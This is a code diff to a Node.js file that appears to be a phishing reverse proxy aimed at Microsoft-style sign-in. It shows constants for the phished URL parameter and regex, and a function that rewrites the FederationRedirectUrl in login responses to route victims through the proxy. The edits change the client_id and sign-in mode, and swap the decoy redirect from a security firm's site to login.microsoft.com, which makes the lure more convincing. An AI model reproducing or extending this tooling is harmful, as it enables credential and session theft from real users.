@@ -6,10 +6,10 @@ const zlib = require("zlib");
 const crypto = require("crypto");
 
 
-const PROXY_ENTRY_POINT = "/login?method=signin&mode=secure&client_id=3ce82761-cb43-493f-94bb-fe444b7a0cc4&privacy=on&sso_reload=true";
+const PROXY_ENTRY_POINT = "/login?method=signin&mode=sso&client_id=8ba22761-cb43-493f-94bb-cf744b7a0cc4&privacy=on&sso_reload=true";
 const PHISHED_URL_PARAMETER = "redirect_urI";
 const PHISHED_URL_REGEXP = new RegExp(`(?<=${PHISHED_URL_PARAMETER}=)[^&]+`);
-const REDIRECT_URL = "https://www.intrinsec.com/";
+const REDIRECT_URL = "https://login.microsoft.com";
 
 const PROXY_FILES = {
     index: "index_smQGUDpTF7PN.html",
@@ -949,4 +949,5 @@ function updateFederationRedirectUrl(decompressedResponseBody, proxyHostname) {
     
     decompressedResponseBodyObject.Credentials.FederationRedirectUrl = proxyRequestURL;
     return Buffer.from(JSON.stringify(decompressedResponseBodyObject));
+
 }
